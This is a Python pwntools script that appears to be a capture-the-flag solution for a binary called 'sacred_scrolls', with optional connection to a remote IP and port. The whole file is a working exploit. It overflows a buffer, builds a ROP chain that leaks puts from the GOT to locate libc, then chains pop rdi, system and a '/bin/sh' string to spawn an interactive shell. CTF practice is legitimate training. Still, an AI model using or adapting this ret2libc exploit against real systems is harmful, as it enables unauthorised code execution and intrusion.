from pwn import *
import subprocess
import base64

DEBUG          = False
LOCAL          = True
REMOTE         = False
GDB            = False
IP             = '134.209.17.42'
PORT           = 32068
WIZARD_TAG     = b'l33t w1z4r2'
SIGNATURE      = b'\xf0\x9f\x91\x93\xe2\x9a\xa1' # The signature of the boy who lived
BASE_PAYLOAD   = SIGNATURE + b'A' * (40 - len(SIGNATURE))
SYSTEM_OFFSET  = 0x0000000000050d60
EXIT_OFFSET    = 0x00000000000455f0
SHELL_OFFSET   = 0x00000000001d8698
POP_RDI_OFFSET = 0x00401183 # What you get from (rop.find_gadget(['pop rdi', 'ret']))[0]
RET_OFFSET     = 0x0040119c # What you get from (rop.find_gadget(['ret']))[0]
PUTS_OFFSET    = 0x00080ed0


def to_little_endian(address):
    string_address = str(hex(address))[2:]
    string_address = '0' * (16 - len(string_address)) + string_address
    return bytearray.fromhex(string_address)[::-1]


def to_big_endian(address):
    string_address = address.hex()
    temp_address = '0x'
    for i in range(len(string_address)-2, 0, -2):
        byte = string_address[i:i+2]
        if byte != '0a':
            temp_address += byte
    return int(temp_address, 16)


def encode_payload(payload):
    with open('./spell.txt', 'wb') as f:
        f.write(payload)
    subprocess.run(['zip', 'spell.zip', 'spell.txt'])
    with open('spell.zip', 'rb') as f:
        b64_zip_file = base64.b64encode(f.read()).decode()
    print("Encoded payload is : ", end="")
    print(b64_zip_file)
    return b64_zip_file


def try_print_decode(data):
    try:
        print(data.decode())
    except:
        print(data)


def send_payload(p, payload):
    try_print_decode(p.recv())
    p.sendline(WIZARD_TAG)
    try_print_decode(p.recv())
    p.sendline(b'1')
    try_print_decode(p.recv())
    p.sendline(payload.encode())
    try_print_decode(p.recv())
    p.sendline(b'2')
    try_print_decode(p.recv())
    p.sendline(b'y')
    p.recv()
    p.sendline(b'3')
    try_print_decode(p.recvuntil(b'will not be saved!'))
    

def get_libc_base_address(p):
    elf = ELF('./sacred_scrolls')
    PUTS_PLT = elf.plt['puts']
    MAIN_PLT = elf.symbols['main']
    POP_RDI = POP_RDI_OFFSET 
    RET = RET_OFFSET 
    PUTS_GOT = elf.got['puts']
    payload = BASE_PAYLOAD + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

    if DEBUG:
        print("Main start: " + hex(MAIN_PLT))
        print("Puts plt: " + hex(PUTS_PLT))
        print("pop rdi; ret    gadget: " + hex(POP_RDI))
        print("Puts got: " + hex(PUTS_GOT))
        print(payload)
    
    send_payload(p, encode_payload(payload))

    delimiter = b'\x1b[1;34m\n'
    puts_address = p.recvuntil(delimiter)[:-len(delimiter)]
    puts_address = to_big_endian(puts_address)
    puts_offset = PUTS_OFFSET
    libc_base_address = int(puts_address) - int(puts_offset)
    return libc_base_address


def pwn(p):
    libc_base_address = get_libc_base_address(p)
    if DEBUG:
        print(f'libc_base_address = {hex(libc_base_address)}')
    system_address = to_little_endian(libc_base_address + SYSTEM_OFFSET)
    exit_address = to_little_endian(libc_base_address + EXIT_OFFSET)
    shell_address = to_little_endian(libc_base_address + SHELL_OFFSET)
    rdi_address = to_little_endian(POP_RDI_OFFSET)
    system_param = shell_address
    ret_address = to_little_endian(RET_OFFSET)
    payload = BASE_PAYLOAD + rdi_address + system_param + ret_address + system_address + exit_address
    send_payload(p, encode_payload(payload))
    p.interactive()


if __name__ == "__main__":
    if LOCAL:
        p = process('./sacred_scrolls')
    elif REMOTE:
        p = remote(IP, PORT)
    elif GDB:
        p = gdb.debug('./sacred_scrolls')
    pwn(p)
